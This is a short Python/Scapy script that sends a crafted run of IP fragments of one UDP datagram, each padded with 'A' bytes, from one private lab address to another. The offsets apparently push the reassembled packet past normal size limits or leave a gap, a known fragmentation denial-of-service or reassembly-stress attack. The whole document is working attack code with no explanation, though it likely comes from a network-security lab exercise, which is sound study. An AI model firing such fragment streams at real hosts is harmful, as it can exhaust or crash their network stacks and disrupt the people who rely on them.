#!/usr/bin/python3

from scapy.all import *
ip=IP(src="172.16.133.129", dst="172.16.133.130")
ip.id=1000

udp=UDP(sport=7070,dport=9090)
udp.len=65507

for i in range (0,43):

	payload='A'*1472
	ip.frag=184*i
	ip.flags=1
	pkt=ip/udp/payload
	pkt[UDP].chksum=0
	send(pkt,verbose=0)


payload='A'*1472
ip.frag=184*44
ip.flags=0
pkt=ip/udp/payload
pkt[UDP].chksum=0
send(pkt,verbose=0)

